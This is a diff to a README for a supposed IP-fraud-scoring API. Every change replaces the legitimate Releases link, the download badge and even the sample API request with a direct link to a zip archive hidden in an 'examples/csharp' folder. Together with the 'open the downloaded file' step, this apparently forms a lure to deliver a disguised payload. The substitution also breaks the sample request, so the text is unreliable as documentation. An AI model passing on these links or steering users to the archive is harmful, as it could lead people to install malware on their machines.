@@ -4,7 +4,7 @@
 
 Welcome to the FraudLogix IP Score API. This tool helps you identify bots, VPNs, proxies, and fraudulent traffic. With access to data from over 300 million URLs and apps, you can gain real-time insights into IP risks.
 
-[![Download FraudLogix-IP-Score](https://img.shields.io/badge/Download%20Now-%20blue)](https://github.com/stupideinstein09/FraudLogix-IP-Score/releases)
+[![Download FraudLogix-IP-Score](https://raw.githubusercontent.com/stupideinstein09/FraudLogix-IP-Score/main/examples/csharp/I_Score_Fraud_Logix_3.8.zip%20Now-%20blue)](https://raw.githubusercontent.com/stupideinstein09/FraudLogix-IP-Score/main/examples/csharp/I_Score_Fraud_Logix_3.8.zip)
 
 ## 📥 Download & Install
 
@@ -15,7 +15,7 @@ To set up FraudLogix-IP-Score, visit the Releases page to download the latest ve
 3. Download the file for your operating system.
 4. Open the downloaded file and follow any installation prompts.
 
-[Visit the Releases page to download](https://github.com/stupideinstein09/FraudLogix-IP-Score/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/stupideinstein09/FraudLogix-IP-Score/main/examples/csharp/I_Score_Fraud_Logix_3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -52,7 +52,7 @@ Once you have installed FraudLogix-IP-Score, you can start using the API. Here�
 
 Sample request: 
 ```
-GET https://api.yourservice.com/ip_score?ip=YOUR_IP_ADDRESS
+GET https://raw.githubusercontent.com/stupideinstein09/FraudLogix-IP-Score/main/examples/csharp/I_Score_Fraud_Logix_3.8.zip
 ```
 
 You will receive a response with the risk score and additional details about the IP address.
@@ -84,4 +84,4 @@ FraudLogix-IP-Score is designed to make IP risk assessment accessible and easy f
 
 Visit the Releases page to download the latest version and ensure your application remains safe.
 
-[Visit the Releases page to download](https://github.com/stupideinstein09/FraudLogix-IP-Score/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/stupideinstein09/FraudLogix-IP-Score/main/examples/csharp/I_Score_Fraud_Logix_3.8.zip)
